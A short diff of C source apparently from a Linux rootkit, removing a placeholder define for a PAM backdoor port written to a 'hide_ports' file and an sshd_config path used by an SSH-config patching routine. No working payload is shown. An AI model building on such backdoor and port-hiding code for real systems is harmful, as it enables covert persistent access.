@@ -11,10 +11,6 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
 #include "pam/pam_syslog.c"
 
-/* this is literally only here so that we can write
- * a hidden port to the hide_ports file. */
-#define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]
-
 #ifdef PATCH_SSHD_CONFIG
 
 /* if the size of /etc/ssh/sshd_config's contents
@@ -37,7 +33,6 @@ void addsetting(char *setting, char *value, char **buf);
 size_t writesshd(char *buf, int mode);
 int sshdok(int res[], char **buf, size_t *sshdsize);
 void sshdpatch(int mode);
-#define SSHD_CONFIG "??SSHD_CONFIG??" // [PATCH_SSHD_CONFIG]
 #include "sshdpatch/sshdchk.c"
 
 #endif
